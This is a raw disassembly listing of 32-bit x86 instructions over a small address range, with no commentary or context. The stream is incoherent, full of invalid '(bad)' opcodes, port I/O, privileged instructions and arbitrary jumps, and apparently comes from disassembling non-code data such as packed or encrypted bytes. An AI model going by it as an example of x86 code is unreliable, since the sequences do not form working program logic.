  48c035:	inc    edx
  48c036:	mov    bh,0xeb
  48c038:	xchg   edx,eax
  48c039:	push   DWORD PTR [edi]
  48c03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c03c:	daa    
  48c03d:	test   eax,0x36df3103
  48c042:	stos   BYTE PTR es:[edi],al
  48c043:	adc    ch,BYTE PTR [esi-0x50cca053]
  48c049:	push   ebp
  48c04a:	sbb    bl,BYTE PTR [eax]
  48c04c:	rol    DWORD PTR [edi],0x37
  48c04f:	lds    eax,FWORD PTR [eax]
  48c051:	jbe    0x48c0b3
  48c053:	stos   DWORD PTR es:[edi],eax
  48c054:	daa    
  48c055:	cmp    cl,BYTE PTR [eax+eiz*8]
  48c058:	pusha  
  48c059:	movsx  eax,bx
  48c05c:	push   esi
  48c05d:	mov    eax,ds:0x302fcf90
  48c062:	push   esi
  48c063:	xor    ecx,DWORD PTR [ecx+0x43adf725]
  48c069:	inc    esi
  48c06a:	mov    ah,BYTE PTR [edi]
  48c06c:	out    0xc4,eax
  48c06e:	xor    al,0x9a
  48c070:	sub    al,0x5f
  48c072:	out    dx,eax
  48c073:	lods   eax,DWORD PTR ds:[esi]
  48c074:	add    DWORD PTR [ebx-0x6b7f485b],edx
  48c07a:	pop    esp
  48c07b:	mov    bl,0xef
  48c07d:	inc    esp
  48c07e:	fcom   st(6)
  48c080:	imul   esi,DWORD PTR [ebx-0x57ee9d61],0x15
  48c087:	lods   eax,DWORD PTR ds:[esi]
  48c088:	pop    es
  48c089:	daa    
  48c08a:	inc    edi
  48c08b:	xor    BYTE PTR [edx],ah
  48c08d:	xchg   BYTE PTR [esi+0x7f],dl
  48c090:	push   ebp
  48c091:	inc    ebx
  48c092:	mov    edx,0x12dfc706
  48c097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c098:	ret    
  48c099:	rol    BYTE PTR [edx-0x51],cl
  48c09c:	xor    DWORD PTR [edx],eax
  48c09e:	cdq    
  48c09f:	nop
  48c0a0:	push   ds
  48c0a1:	mov    bh,0x38
  48c0a3:	xor    al,0xe3
  48c0a5:	add    edx,DWORD PTR es:[ebp+0x37]
  48c0a9:	xor    eax,0xc122d67e
  48c0ae:	dec    ecx
  48c0af:	neg    DWORD PTR [edx+0x57]
  48c0b2:	cmp    al,BYTE PTR ds:0x6767d7ed
  48c0b8:	ins    BYTE PTR es:[edi],dx
  48c0b9:	mov    ebp,0xbfd740b5
  48c0be:	xchg   esp,eax
  48c0bf:	xchg   edx,eax
  48c0c0:	xor    BYTE PTR [edx+0x41821fef],bh
  48c0c6:	cli    
  48c0c7:	pop    edx
  48c0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c0c9:	mov    bh,0x55
  48c0cb:	dec    esp
  48c0cc:	add    al,0x64
  48c0ce:	inc    ecx
  48c0cf:	fisttp WORD PTR [eax+0x31cc236a]
  48c0d5:	aaa    
  48c0d6:	outs   dx,DWORD PTR ds:[esi]
  48c0d7:	pusha  
  48c0d8:	xor    eax,0x67c7404b
  48c0dd:	or     al,0x3a
  48c0df:	add    BYTE PTR [edi+0x2b05020b],bh
  48c0e5:	mov    WORD PTR [edi+0x2f],cs
  48c0e8:	mov    DWORD PTR [eax],eax
  48c0ea:	retf   
  48c0eb:	shl    BYTE PTR [edi],0x39
  48c0ee:	daa    
  48c0ef:	mov    ds:0x9719560d,eax
  48c0f4:	repnz xlat BYTE PTR ds:[ebx]
  48c0f6:	push   eax
  48c0f7:	ins    BYTE PTR es:[edi],dx
  48c0f8:	and    BYTE PTR ds:0x99318f0f,cl
  48c0fe:	or     ch,BYTE PTR [ebp-0x51]
  48c101:	addr16 popa 
  48c103:	or     al,0x2e
  48c105:	arpl   WORD PTR [edi-0x2a4ad4ff],bp
  48c10b:	mov    edi,0x50756d87
  48c110:	pop    eax
  48c111:	outs   dx,DWORD PTR ds:[esi]
  48c112:	pop    ds
  48c113:	add    edi,DWORD PTR [eax+0x53623d35]
  48c119:	pop    edi
  48c11a:	inc    esi
  48c11b:	inc    ebp
  48c11c:	adc    dh,BYTE PTR [esi-0x2f]
  48c11f:	push   DWORD PTR [edi]
  48c121:	mov    dh,0x55
  48c123:	dec    ebp
  48c124:	bound  edx,QWORD PTR [edi+0x3]
  48c127:	test   eax,0x4f936f01
  48c12c:	aas    
  48c12d:	pop    es
  48c12e:	test   BYTE PTR [eax+eiz*1+0x5d],bl
  48c132:	aas    
  48c133:	out    dx,al
  48c134:	cmp    BYTE PTR [esi],ch
  48c136:	or     ecx,DWORD PTR cs:[eax+0x7]
  48c13a:	xor    al,0x3b
  48c13c:	add    BYTE PTR [eax+ebp*4],ch
  48c13f:	pop    ss
  48c140:	inc    edi
  48c141:	popa   
  48c142:	sar    DWORD PTR [edx-0x428ce73],1
  48c148:	mov    ah,BYTE PTR [edx-0x4b]
  48c14b:	jne    0x48c1cc
  48c14d:	xlat   BYTE PTR ds:[ebx]
  48c14e:	xlat   BYTE PTR ds:[ebx]
  48c14f:	adc    BYTE PTR [esp+eax*2],0x38
  48c153:	xor    edi,edx
  48c155:	pop    ss
  48c156:	es push edx
  48c158:	stos   DWORD PTR es:[edi],eax
  48c159:	(bad)  
  48c15a:	das    
  48c15b:	scas   eax,DWORD PTR es:[edi]
  48c15c:	and    BYTE PTR [edi],cl
  48c15e:	push   ecx
  48c15f:	test   bh,dl
  48c161:	xor    BYTE PTR [eax],al
  48c163:	xor    cl,BYTE PTR [eax-0x31b95972]
  48c169:	xlat   BYTE PTR ds:[ebx]
  48c16a:	test   eax,0x3e85d609
  48c16f:	fild   QWORD PTR [esi-0x5d892f2f]
  48c175:	div    edi
  48c177:	xor    DWORD PTR [edx+0x13],eax
  48c17a:	inc    esp
  48c17b:	and    al,bh
  48c17d:	inc    edx
  48c17e:	xor    al,0x91
  48c180:	call   0xab48:0xdf33c780
  48c187:	add    cl,BYTE PTR [edx+0x3f]
  48c18a:	enter  0x88d,0xc7
  48c18e:	mov    esi,0xe933efbf
  48c193:	add    BYTE PTR [ebp-0x6c08c87e],dh
  48c199:	pop    es
  48c19a:	sbb    cl,BYTE PTR [ecx+0x38bf44]
  48c1a0:	inc    ecx
  48c1a1:	xchg   DWORD PTR [edi+eax*8-0x58e138a0],eax
  48c1a8:	xor    ah,ah
  48c1aa:	sbb    BYTE PTR [esi+0x17],dl
  48c1ad:	xor    dh,al
  48c1af:	push   eax
  48c1b0:	push   ss
  48c1b1:	or     dl,bh
  48c1b3:	and    bh,dl
  48c1b5:	or     cl,BYTE PTR [ecx]
  48c1b7:	pop    eax
  48c1b8:	aam    0xc7
  48c1ba:	inc    edi
  48c1bb:	or     DWORD PTR [eax],eax
  48c1bd:	ds mov ch,0xcf
  48c1c0:	cwde   
  48c1c1:	push   esi
  48c1c2:	ror    DWORD PTR [eax+0x1c2f67d7],0x5
  48c1c9:	fnsetpm(287 only) 
  48c1cb:	xor    DWORD PTR [edi],esi
  48c1cd:	outs   dx,DWORD PTR ds:[esi]
  48c1ce:	xor    DWORD PTR [eax-0x789159e8],edi
  48c1d4:	xor    al,0x37
  48c1d6:	xor    eax,DWORD PTR [edx]
  48c1d8:	jbe    0x48c242
  48c1da:	aad    0xb7
  48c1dc:	sbb    edx,edx
  48c1de:	pop    ebx
  48c1df:	dec    ebx
  48c1e0:	add    al,0x7
  48c1e2:	aaa    
  48c1e3:	jae    0x48c23f
  48c1e5:	mov    DWORD PTR [edx+0x12f6fc9],0xa71b7563
  48c1ef:	pop    esp
  48c1f0:	daa    
  48c1f1:	push   ss
  48c1f2:	(bad)  [edi]
  48c1f4:	aas    
  48c1f5:	push   edi
  48c1f6:	inc    ebp
  48c1f7:	and    al,0x56
  48c1f9:	adc    eax,DWORD PTR [eax]
  48c1fb:	iret   
  48c1fc:	inc    esi
  48c1fd:	sbb    al,0x52
  48c1ff:	bound  ebp,QWORD PTR [edi+0x3c6686c7]
  48c205:	add    al,0x8b
  48c207:	aaa    
  48c208:	(bad)  
  48c209:	aaa    
  48c20a:	push   esi
  48c20b:	pusha  
  48c20c:	and    BYTE PTR [ebx-0x55],dl
  48c20f:	das    
  48c210:	add    BYTE PTR [ecx],0xc7
  48c213:	sbb    dh,BYTE PTR [edi-0x5696b881]
  48c219:	or     edx,edx
  48c21b:	scas   eax,DWORD PTR es:[edi]
  48c21c:	ja     0x48c21e
  48c21e:	push   0x5a6f4210
  48c223:	leave  
  48c224:	mov    al,0x51
  48c226:	dec    edi
  48c227:	scas   eax,DWORD PTR es:[edi]
  48c228:	xor    DWORD PTR [eax-0x40e5cba8],edi
  48c22e:	pop    edi
  48c22f:	sub    BYTE PTR [edx-0x10e8d54c],ah
  48c235:	outs   dx,BYTE PTR ds:[esi]
  48c236:	xor    eax,0xbfd7d941
  48c23b:	inc    edx
  48c23c:	and    al,BYTE PTR [edx+0x5]
  48c23f:	add    dl,BYTE PTR [edi-0x32978a75]
  48c245:	out    dx,eax
  48c246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c247:	pause  
  48c249:	jl     0x48c281
  48c24b:	add    BYTE PTR [edi-0x4efe36be],dl
  48c251:	mov    al,ds:0x202946bf
  48c256:	push   esp
  48c257:	push   0xd6c0aef
  48c25c:	sbb    BYTE PTR [edi+0x7560247],cl
  48c262:	mov    ah,0x57
  48c264:	mov    eax,0x77528ba8
  48c269:	xor    ebx,DWORD PTR [edi-0x71]
  48c26c:	pop    edx
  48c26d:	xor    DWORD PTR [edi+eax*4+0x686295ef],edx
  48c274:	inc    ebp
  48c275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c276:	pop    es
  48c277:	shl    BYTE PTR [eax],0x82
  48c27a:	scas   al,BYTE PTR es:[edi]
  48c27b:	jnp    0x48c2a4
  48c27d:	daa    
  48c27e:	sub    BYTE PTR [edi+ebx*8-0x11],ch
  48c282:	(bad)  
  48c283:	test   ecx,0xc7682c54
  48c289:	inc    esi
  48c28a:	or     BYTE PTR [ecx+edx*2],cl
  48c28d:	imul   esi,edi,0x12264c38
  48c293:	xor    edi,eax
  48c295:	push   edi
  48c296:	add    eax,0xdf46c4b9
  48c29b:	jae    0x48c2ae
  48c29d:	sbb    cl,BYTE PTR [ebp+0x57be3f5b]
  48c2a3:	pusha  
  48c2a4:	push   esp
  48c2a5:	mov    BYTE PTR ds:0xa09757e7,0x15
  48c2ac:	ret    
  48c2ad:	xcrypt-ofb (bad)
  48c2ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c2af:	outs   dx,DWORD PTR ds:[esi]
  48c2b0:	mov    edx,0x67585026
  48c2b5:	inc    ebx
  48c2b6:	xor    al,0x80
  48c2b8:	jne    0x48c253
  48c2ba:	xchg   edi,eax
  48c2bb:	out    0x88,al
  48c2bd:	nop
  48c2be:	loop   0x48c327
  48c2c0:	sysenter 
  48c2c2:	stos   BYTE PTR es:[edi],al
  48c2c3:	mov    ah,0x4a
  48c2c5:	pop    ecx
  48c2c6:	dec    edi
  48c2c7:	dec    edi
  48c2c8:	adc    BYTE PTR [esi-0x68cb1ad4],cl
  48c2ce:	inc    ebp
  48c2cf:	rol    bl,1
  48c2d1:	test   al,0xcf
  48c2d3:	aaa    
  48c2d4:	aas    
  48c2d5:	imul   ecx,DWORD PTR [ebp-0x80],0x8d9a7f12
  48c2dc:	mov    bh,0x2e
  48c2de:	jmp    FWORD PTR [ebx]
  48c2e0:	jg     0x48c34e
  48c2e2:	pop    edi
  48c2e3:	dec    eax
  48c2e4:	push   ecx
  48c2e5:	mov    bh,0xd7
  48c2e7:	das    
  48c2e8:	lods   eax,DWORD PTR ds:[esi]
  48c2e9:	inc    esi
  48c2ea:	inc    ecx
  48c2eb:	lss    ebp,FWORD PTR [edi-0x78]
  48c2ef:	aad    0xa4
  48c2f1:	xor    eax,0x18d372f
  48c2f6:	pop    edx
  48c2f7:	xchg   DWORD PTR [ebx-0x3a5766d9],esp
  48c2fd:	add    eax,0x842277bf
  48c302:	je     0x48c34c
  48c304:	mov    esi,0xd1ba5b35
  48c309:	and    BYTE PTR [edi],ah
  48c30b:	push   ds
  48c30c:	jmp    0xbfb9ed57
  48c311:	iret   
  48c312:	inc    ebx
  48c313:	adc    eax,0x573134a9
  48c318:	ss iret 
  48c31a:	sti    
  48c31b:	test   BYTE PTR [ebx-0x59],cl
  48c31e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c31f:	(bad)  
  48c320:	and    bl,BYTE PTR [ebx+eax*1-0x53]
  48c324:	test   DWORD PTR [edi+0x1b],0x423e32ff
  48c32b:	add    ecx,DWORD PTR [ecx]
  48c32d:	jg     0x48c35e
  48c32f:	or     eax,DWORD PTR [edx-0x3c]
  48c332:	add    al,BYTE PTR [edi]
  48c334:	pop    es
  48c335:	xchg   ebp,eax
  48c336:	mov    ah,0xe
  48c338:	push   ecx
  48c339:	aaa    
  48c33a:	scas   eax,DWORD PTR es:[edi]
  48c33b:	mov    cl,0x50
  48c33d:	sbb    ch,BYTE PTR [ebp-0x69]
  48c340:	outs   dx,DWORD PTR ds:[esi]
  48c341:	or     BYTE PTR [edx+edx*1-0x75],bl
  48c345:	retf   
  48c346:	add    ebx,DWORD PTR [ecx]
  48c348:	push   ss
  48c349:	push   0xf3d7af11
  48c34e:	ins    DWORD PTR es:[edi],dx
  48c34f:	xchg   ebx,eax
  48c350:	pop    esp
  48c351:	sbb    DWORD PTR [esi],esp
  48c353:	xor    esi,DWORD PTR ds:0x20a09437
  48c359:	rcr    BYTE PTR [ebx-0xf24d8be],1
  48c35f:	hlt    
  48c360:	push   esi
  48c361:	ja     0x48c35e
  48c363:	out    dx,eax
  48c364:	mov    edi,0x874a0762
  48c369:	test   eax,0x9b607f37
  48c36e:	cmp    al,0x8
  48c370:	mov    esi,0xdadb3742
  48c375:	sub    al,BYTE PTR [edi+edx*2-0x61]
  48c379:	and    ebp,DWORD PTR [eax]
  48c37b:	rcl    BYTE PTR [edx+0x47349f69],0x21
  48c382:	xchg   BYTE PTR [ebp-0xf6820b0],al
  48c388:	dec    ecx
  48c389:	lods   eax,DWORD PTR ds:[esi]
  48c38a:	sbb    bh,ch
  48c38c:	dec    ebx
  48c38d:	and    DWORD PTR [edx],eax
  48c38f:	fcmovnbe st,st(2)
  48c391:	inc    bp
  48c393:	jmp    0x48c3f7
  48c395:	and    esp,DWORD PTR ds:0x7f4457d3
  48c39b:	push   ss
  48c39c:	mov    WORD PTR [eax-0x3f],fs
  48c39f:	xchg   edi,eax
  48c3a0:	pop    edi
  48c3a1:	pop    es
  48c3a2:	aam    0x33
  48c3a4:	xor    BYTE PTR [edx-0x7bdf6c59],cl
  48c3aa:	jno    0x48c3f8
  48c3ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c3ad:	inc    ecx
  48c3ae:	aaa    
  48c3af:	add    BYTE PTR gs:[ebx],bl
  48c3b2:	xchg   esp,eax
  48c3b3:	das    
  48c3b4:	push   es
  48c3b5:	mov    bh,0x81
  48c3b7:	aad    0x9f
  48c3b9:	pop    edi
  48c3ba:	cwde   
  48c3bb:	dec    esp
  48c3bc:	in     eax,dx
  48c3bd:	add    BYTE PTR [ebx-0x59],bh
  48c3c0:	add    DWORD PTR [esi],eax
  48c3c2:	xchg   ebp,eax
  48c3c3:	xor    bh,ch
  48c3c5:	ja     0x48c354
  48c3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c3c8:	push   es
  48c3c9:	fld    TBYTE PTR [edi-0x28de9016]
  48c3cf:	push   ss
  48c3d0:	adc    bl,BYTE PTR [esi+0x1c52043]
  48c3d6:	dec    ebp
  48c3d7:	cmp    BYTE PTR [edi],ch
  48c3d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c3da:	mov    ah,0xaa
  48c3dc:	or     edi,0xbb63741
  48c3e2:	inc    esi
  48c3e3:	sub    eax,0xaf3207d7
  48c3e8:	(bad)  
  48c3e9:	sbb    BYTE PTR [eax+0x25dc2702],0xad
  48c3f0:	sbb    ebx,DWORD PTR [edi-0x6b93baa9]
  48c3f6:	adc    al,0x92
  48c3f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c3f9:	mov    edi,0x489d6149
  48c3fe:	lahf   
  48c3ff:	push   ss
  48c400:	ret    
  48c401:	inc    ebp
  48c402:	pop    edx
  48c403:	aas    
  48c404:	push   edi
  48c405:	ss xchg edi,eax
  48c407:	xchg   ecx,eax
  48c408:	inc    edx
  48c409:	call   0x637f2baf
  48c40e:	shr    BYTE PTR [edx],cl
  48c410:	rcl    BYTE PTR [edi],cl
  48c412:	(bad)  
  48c413:	aaa    
  48c414:	push   ebx
  48c415:	sub    esi,DWORD PTR [ebp+edx*4+0x5f]
  48c419:	aaa    
  48c41a:	mov    bh,0x55
  48c41c:	add    esp,DWORD PTR [edx+ebp*2]
  48c41f:	jmp    0x48c42b
  48c421:	rol    edx,cl
  48c423:	pop    ebx
  48c424:	mov    cl,0x80
  48c426:	inc    edi
  48c428:	pop    ebx
  48c429:	fisubr DWORD PTR [eax+0x2d]
  48c42c:	stos   DWORD PTR es:[edi],eax
  48c42d:	ja     0x48c4a9
  48c42f:	and    ah,BYTE PTR [esi+0x38ff07a5]
  48c435:	mov    ds:0x59a6536b,eax
  48c43a:	outs   dx,DWORD PTR ds:[esi]
  48c43b:	inc    ebx
  48c43c:	out    0x2e,eax
  48c43e:	xchg   ch,dl
  48c440:	ins    DWORD PTR es:[edi],dx
  48c441:	mov    edi,0x95874237
  48c446:	loopne 0x48c3d8
  48c448:	(bad)  
  48c449:	lahf   
  48c44a:	push   ss
  48c44b:	pop    esp
  48c44c:	mov    ds:0x2f44a706,eax
  48c451:	push   ds
  48c452:	mov    eax,ds:0x8f5f9b0d
  48c457:	mov    edi,0xd4294ec1
  48c45c:	fild   WORD PTR [edi]
  48c45e:	lahf   
  48c45f:	dec    eax
  48c460:	pusha  
  48c461:	shl    BYTE PTR [eax],0x34
  48c464:	(bad)  
  48c465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c466:	mov    ebx,0x975756d8
  48c46b:	shl    edi,cl
  48c46d:	xor    al,0xc9
  48c46f:	xor    edx,DWORD PTR [esp+ebp*1]
  48c472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c473:	inc    esp
  48c474:	cmp    DWORD PTR [eax+0xf813a38],edx
  48c47a:	inc    esi
  48c47b:	pop    eax
  48c47c:	mov    WORD PTR [edi],?
  48c47e:	adc    al,0x9f
  48c480:	inc    edx
  48c481:	and    ebp,edi
  48c483:	test   al,0xad
  48c485:	pusha  
  48c486:	sub    al,BYTE PTR [edi]
  48c488:	inc    esp
  48c489:	addr16 addr16 test esp,edx
  48c48d:	mov    ah,BYTE PTR [ecx+0x39]
  48c490:	addr16 daa 
  48c492:	xor    eax,0x475a4136
  48c497:	das    
  48c498:	push   0x46173aeb
  48c49d:	aas    
  48c49e:	iret   
  48c49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c4a0:	in     al,0x2a
  48c4a2:	fs inc edx
  48c4a4:	inc    ebp
  48c4a5:	push   ss
  48c4a6:	adc    al,0x93
  48c4a8:	push   cs
  48c4a9:	cs xor al,0x67
  48c4ac:	push   0x25
  48c4ae:	pop    edx
  48c4af:	mov    ah,BYTE PTR [edi]
  48c4b1:	(bad)  
  48c4b2:	xchg   edi,eax
  48c4b3:	shr    DWORD PTR ss:[eax],0xe9
  48c4b7:	cmp    BYTE PTR [edi],ch
  48c4b9:	xor    cl,bh
  48c4bb:	lods   al,BYTE PTR ds:[esi]
  48c4bc:	in     al,0xe
  48c4be:	mov    ds:0x360037cf,eax
  48c4c3:	add    DWORD PTR ds:0xf707158a,ebp
  48c4c9:	push   es
  48c4ca:	add    ebx,eax
  48c4cc:	shr    DWORD PTR [edi-0x4ea938ba],0x90
  48c4d3:	add    ebp,DWORD PTR [eax]
  48c4d5:	xchg   edi,eax
  48c4d6:	inc    ecx
  48c4d7:	ins    DWORD PTR es:[edi],dx
  48c4d8:	nop
  48c4d9:	inc    esi
  48c4da:	pop    ebx
  48c4db:	pop    ss
  48c4dc:	lahf   
  48c4dd:	pop    DWORD PTR [ecx-0x702da8db]
  48c4e3:	ss inc ebx
  48c4e5:	dec    ebp
  48c4e6:	les    eax,FWORD PTR [edx-0x18f8b8bb]
  48c4ec:	mov    ds:0x4f2b01c6,eax
  48c4f1:	(bad)
  48c4f5:	push   0x514a2757
  48c4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c4fb:	pop    eax
  48c4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c4fd:	dec    edi
  48c4fe:	mov    edx,0x97537580
  48c503:	pop    ds
  48c504:	outs   dx,BYTE PTR ds:[esi]
  48c505:	push   ecx
  48c506:	mov    ds:0x676731e2,eax
  48c50b:	stos   DWORD PTR es:[edi],eax
  48c50c:	adc    BYTE PTR [esi-0x3d],0x9f
  48c510:	pop    edi
  48c511:	mov    ds:0xdf0a4e98,al
  48c516:	xor    DWORD PTR [edi],ebp
  48c518:	mov    ah,0x34
  48c51a:	inc    edx
  48c51b:	xor    al,BYTE PTR ds:[eax]
  48c51e:	inc    ecx
  48c51f:	sbb    esp,DWORD PTR [ecx+eax*8-0x38b57896]
  48c526:	ret    0x90ad
  48c529:	push   edi
  48c52a:	aaa    
  48c52b:	xor    dl,BYTE PTR [edi]
  48c52d:	aam    0xcd
  48c52f:	pop    eax
  48c530:	inc    ebp
  48c531:	pop    es
  48c532:	pop    ds
  48c533:	inc    esp
  48c534:	lods   al,BYTE PTR ds:[esi]
  48c535:	mov    ecx,DWORD PTR [eax+0xc]
  48c538:	(bad)  
  48c539:	out    dx,eax
  48c53a:	jb     0x48c550
  48c53c:	xor    ecx,DWORD PTR [eax]
  48c53e:	fild   WORD PTR [edx+0x31]
  48c541:	add    ebp,DWORD PTR [ebx]
  48c543:	dec    edx
  48c544:	lahf   
  48c545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c546:	cmp    BYTE PTR [esi+0x30c70af4],al
  48c54c:	inc    DWORD PTR [ebx]
  48c54e:	mov    eax,ds:0xcf44064d
  48c553:	ins    BYTE PTR es:[edi],dx
  48c554:	add    DWORD PTR [ecx+0x1437dfad],esp
  48c55a:	test   BYTE PTR [edx-0x28c8583b],ch
  48c560:	xchg   ebx,eax
  48c561:	lods   eax,DWORD PTR ds:[esi]
  48c562:	dec    ebx
  48c563:	and    dl,BYTE PTR [edi]
  48c565:	neg    DWORD PTR [esi]
  48c567:	lock lods al,BYTE PTR ds:[esi]
  48c569:	add    eax,0x75883f9f
  48c56e:	lods   al,BYTE PTR ds:[esi]
  48c56f:	or     ch,bh
  48c571:	(bad)  
  48c572:	mov    ss,WORD PTR [ebp+0x60]
  48c575:	adc    eax,edi
  48c577:	(bad)  
  48c578:	pop    ds
  48c579:	and    BYTE PTR [eax+0x1ad79054],bh
  48c57f:	xlat   BYTE PTR ds:[ebx]
  48c580:	sub    al,0x90
  48c582:	push   ss
  48c583:	and    edx,edi
  48c585:	inc    esi
  48c586:	add    dl,BYTE PTR [esi-0x4d]
  48c589:	add    eax,0x8b73a06f
  48c58e:	dec    edx
  48c58f:	iret   
  48c590:	mov    edi,0x26ab6686
  48c595:	sar    BYTE PTR [edi],cl
  48c597:	xlat   BYTE PTR ds:[ebx]
  48c598:	aas    
  48c599:	inc    esi
  48c59a:	adc    edi,DWORD PTR [ebp+0x13374b0d]
  48c5a0:	(bad)  
  48c5a1:	xor    dl,ch
  48c5a3:	jo     0x48c52a
  48c5a5:	and    eax,0x40280f6b
  48c5aa:	mov    eax,ds:0x2dd9f8c
  48c5af:	push   esi
  48c5b0:	dec    ebp
  48c5b1:	fild   QWORD PTR [ebx]
  48c5b3:	or     DWORD PTR [esi],ecx
  48c5b5:	xchg   ecx,eax
  48c5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c5b7:	jg     0x48c584
  48c5b9:	das    
  48c5ba:	lea    ebx,[eax-0x49]
  48c5bd:	test   al,0x33
  48c5bf:	out    dx,eax
  48c5c0:	dec    edi
  48c5c1:	add    al,0x14
  48c5c3:	mov    ah,BYTE PTR [ebp-0x15c949f9]
  48c5c9:	sub    BYTE PTR [edi+0x34],dh
  48c5cc:	pop    ss
  48c5cd:	xchg   esi,eax
  48c5ce:	pop    edx
  48c5cf:	pop    eax
  48c5d0:	popf   
  48c5d1:	daa    
  48c5d2:	jnp    0x48c573
  48c5d4:	and    eax,0xbbd1d23d
  48c5d9:	dec    edi
  48c5da:	inc    edx
  48c5db:	dec    eax
  48c5dc:	jno    0x48c5c0
  48c5de:	sar    bh,cl
  48c5e0:	dec    edx
  48c5e1:	mov    esp,db1
  48c5e4:	or     WORD PTR [edi+0x26],si
  48c5e8:	pop    ecx
  48c5e9:	xchg   DWORD PTR [ebp+0x4f],eax
  48c5ec:	and    al,BYTE PTR [edi]
  48c5ee:	jmp    0x48c646
  48c5f0:	pop    eax
  48c5f1:	and    DWORD PTR [edi-0x31],ecx
  48c5f4:	xor    al,0xef
  48c5f6:	fist   DWORD PTR [esi+0x28]
  48c5f9:	push   0x20cb57f7
  48c5fe:	test   BYTE PTR [eax+edx*8+0x3a],dh
  48c602:	inc    edi
  48c603:	pop    es
  48c604:	sub    edx,esi
  48c606:	mov    dh,0xe7
  48c608:	pop    ds
  48c609:	retf   
  48c60a:	mov    BYTE PTR [eax+0x56],al
  48c60d:	bound  eax,QWORD PTR [edi-0x19]
  48c610:	and    ch,cl
  48c612:	rcl    ch,0x67
  48c615:	ss aaa 
  48c617:	push   eax
  48c618:	mov    DWORD PTR [ebx+0x64],eax
  48c61b:	xor    eax,0xad0c9f16
  48c620:	add    ecx,DWORD PTR [ebx+0x10e05fe2]
  48c626:	inc    edx
  48c627:	sub    al,BYTE PTR [esi+0x45]
  48c62a:	mov    edx,0x292a1044
  48c62f:	push   DWORD PTR [edi]
  48c631:	pop    esp
  48c632:	leave  
  48c633:	xchg   ecx,eax
  48c634:	cmp    al,0x45
  48c636:	add    BYTE PTR [ecx+0x32],al
  48c639:	add    ebp,DWORD PTR ss:[ebx-0x4e]
  48c63d:	xchg   esi,eax
  48c63e:	iret   
  48c63f:	ds sahf 
  48c641:	sub    DWORD PTR [ebp-0x73e0fc31],ebp
  48c647:	adc    ah,dl
  48c649:	es test edx,0xbb9ea6ed
  48c650:	ja     0x48c6cd
  48c652:	dec    edx
  48c653:	jp     0x48c6af
  48c655:	aaa    
  48c656:	das    
  48c657:	xor    al,0x7f
  48c659:	cmp    DWORD PTR [esi],eax
  48c65b:	lods   al,BYTE PTR ds:[esi]
  48c65c:	mov    dl,BYTE PTR [eax+0x7]
  48c65f:	xchg   DWORD PTR [ebx+0x55],ebp
  48c662:	ret    0xbe0d
  48c665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c666:	adc    al,0x30
  48c668:	adc    DWORD PTR [esi+eiz*8],0x3c163037
  48c66f:	push   edx
  48c670:	adc    eax,0x63ac0fef
  48c675:	jnp    0x48c622
  48c677:	push   edi
  48c678:	imul   ebp,DWORD PTR [ebx+0x63ab041f],0x75
  48c67f:	pop    edi
  48c680:	xchg   DWORD PTR [edi],ebx
  48c682:	mov    bl,0xad
  48c684:	dec    ebp
  48c685:	pop    eax
  48c686:	imul   edi
  48c688:	test   BYTE PTR [esi+0x1f465613],al
  48c68e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c68f:	or     esp,DWORD PTR [edx]
  48c691:	adc    al,0x7f
  48c693:	mov    edi,0xd4cc682f
  48c698:	mov    dh,0x77
  48c69a:	pop    ds
  48c69b:	add    eax,0x1e784d89
  48c6a0:	pop    es
  48c6a1:	mov    bh,0x21
  48c6a3:	or     al,0x2c
  48c6a5:	push   ss
  48c6a6:	sahf   
  48c6a7:	lahf   
  48c6a8:	lods   eax,DWORD PTR ds:[esi]
  48c6a9:	add    ch,BYTE PTR [edi+0x602f2b04]
  48c6af:	add    eax,0xb7abe181
  48c6b4:	aaa    
  48c6b5:	add    eax,0x6726a50f
  48c6ba:	sbb    al,BYTE PTR [edi]
  48c6bc:	jl     0x48c6d6
  48c6be:	mov    DWORD PTR [ebx],ebp
  48c6c0:	addr16 xchg edi,eax
  48c6c2:	sbb    DWORD PTR [edx-0x5c],0x42974715
  48c6c9:	sbb    al,0x42
  48c6cb:	stos   DWORD PTR es:[edi],eax
  48c6cc:	xchg   DWORD PTR [edi],eax
  48c6ce:	ja     0x48c6e5
  48c6d0:	test   DWORD PTR [eax+edx*4-0x61],eax
  48c6d4:	aaa    
  48c6d5:	pop    es
  48c6d6:	popf   
  48c6d7:	add    BYTE PTR [esi+0x27],al
  48c6da:	xor    al,0xe
  48c6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c6dd:	sub    bl,BYTE PTR [ebx-0x19]
  48c6e0:	lahf   
  48c6e1:	xor    eax,0x37386010
  48c6e6:	(bad)  
  48c6e7:	out    0x63,al
  48c6e9:	push   esp
  48c6ea:	or     al,0x49
  48c6ec:	xor    DWORD PTR [ecx+0x3f],eax
  48c6ef:	dec    ecx
  48c6f0:	adc    ebp,0x29
  48c6f3:	(bad)  
  48c6f4:	ja     0x48c73c
  48c6f6:	and    dh,BYTE PTR [ebp+eiz*4-0x5b]
  48c6fa:	mov    edi,0x5362b032
  48c6ff:	jmp    0x63382683
  48c704:	add    al,0xa2
  48c706:	pop    es
  48c707:	packsswb mm3,QWORD PTR [ecx-0x2e]
  48c70b:	add    DWORD PTR [edi],eax
  48c70d:	aaa    
  48c70e:	xchg   edx,eax
